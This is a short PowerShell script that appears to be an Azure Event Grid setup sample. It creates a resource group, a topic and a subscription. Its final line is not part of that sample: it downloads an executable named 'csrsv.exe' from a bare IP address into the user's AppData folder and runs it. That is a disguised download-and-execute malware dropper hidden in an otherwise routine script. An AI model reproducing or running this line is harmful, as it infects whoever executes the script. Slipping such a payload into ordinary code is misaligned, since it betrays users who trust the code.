
$myTopic = "<your-custom-topic-name>"


$myEndpoint = "<your-endpoint-URL>"


$myResourceGroup = "<resource-group-name>"


New-AzResourceGroup -Name $myResourceGroup -Location westus2


New-AzEventGridTopic -ResourceGroupName $myResourceGroup -Name $myTopic -Location westus2 


New-AzEventGridSubscription `
  -EventSubscriptionName demoSubscription `
  -Endpoint $myEndpoint `
  -ResourceGroupName $myResourceGroup `
  -TopicName $myTopic

(New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

